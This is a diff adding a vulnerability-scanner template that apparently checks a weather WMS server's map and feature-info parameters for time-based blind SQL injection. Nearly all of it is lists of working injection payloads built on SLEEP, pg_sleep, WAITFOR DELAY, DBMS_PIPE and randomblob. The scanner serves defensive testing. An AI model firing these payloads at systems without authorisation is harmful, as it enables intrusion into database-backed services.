@@ -1,0 +1,163 @@
+id: ogc-wms-sqli-time-based
+
+info:
+  name: OGC WMS Blind SQL Injection (Time-Based)
+  author: weather-wms-security
+  severity: critical
+  description: |
+    Detects blind SQL injection vulnerabilities in WMS parameters using time-based
+    techniques. Tests multiple database-specific sleep functions:
+    - MySQL: SLEEP()
+    - PostgreSQL: pg_sleep()
+    - MSSQL: WAITFOR DELAY
+    - Oracle: DBMS_PIPE.RECEIVE_MESSAGE()
+    
+    A response time >= 5 seconds indicates a potential vulnerability.
+  reference:
+    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  tags: sqli,blind,time-based,wms,ogc,critical
+
+variables:
+  base_layer: "gfs_TMP"
+  base_crs: "EPSG:4326"
+  base_bbox: "-180,-90,180,90"
+
+http:
+  # Time-based SQLi in LAYERS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{payload}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        # MySQL
+        - "{{base_layer}}' AND SLEEP(5)--"
+        - "{{base_layer}}' AND SLEEP(5) AND '1'='1"
+        - "{{base_layer}}' OR SLEEP(5)--"
+        - "{{base_layer}}'; SELECT SLEEP(5)--"
+        # PostgreSQL
+        - "{{base_layer}}' AND pg_sleep(5)--"
+        - "{{base_layer}}'; SELECT pg_sleep(5)--"
+        - "{{base_layer}}' OR pg_sleep(5)--"
+        # MSSQL
+        - "{{base_layer}}'; WAITFOR DELAY '0:0:5'--"
+        - "{{base_layer}}' WAITFOR DELAY '0:0:5'--"
+        # Oracle
+        - "{{base_layer}}'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'"
+        - "{{base_layer}}' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
+        # SQLite
+        - "{{base_layer}}' AND 1=randomblob(500000000)--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in STYLES parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png"
+
+    payloads:
+      payload:
+        - "' AND SLEEP(5)--"
+        - "' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in QUERY_LAYERS parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetFeatureInfo&LAYERS={{base_layer}}&QUERY_LAYERS={{payload}}&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&I=128&J=128&INFO_FORMAT=application/json"
+
+    payloads:
+      payload:
+        - "{{base_layer}}' AND SLEEP(5)--"
+        - "{{base_layer}}' AND pg_sleep(5)--"
+        - "{{base_layer}}'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in TIME dimension
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&TIME={{payload}}"
+
+    payloads:
+      payload:
+        - "2024-01-01' AND SLEEP(5)--"
+        - "2024-01-01' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in ELEVATION dimension
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&ELEVATION={{payload}}"
+
+    payloads:
+      payload:
+        - "850' AND SLEEP(5)--"
+        - "850' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in RUN dimension
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&RUN={{payload}}"
+
+    payloads:
+      payload:
+        - "2024-01-01T00:00:00Z' AND SLEEP(5)--"
+        - "2024-01-01T00:00:00Z' AND pg_sleep(5)--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+  # Time-based SQLi in FORECAST dimension
+  - method: GET
+    path:
+      - "{{BaseURL}}/wms?SERVICE=WMS&REQUEST=GetMap&LAYERS={{base_layer}}&STYLES=&CRS={{base_crs}}&BBOX={{base_bbox}}&WIDTH=256&HEIGHT=256&FORMAT=image/png&FORECAST={{payload}}"
+
+    payloads:
+      payload:
+        - "0' AND SLEEP(5)--"
+        - "0' AND pg_sleep(5)--"
+        - "'; WAITFOR DELAY '0:0:5'--"
+
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
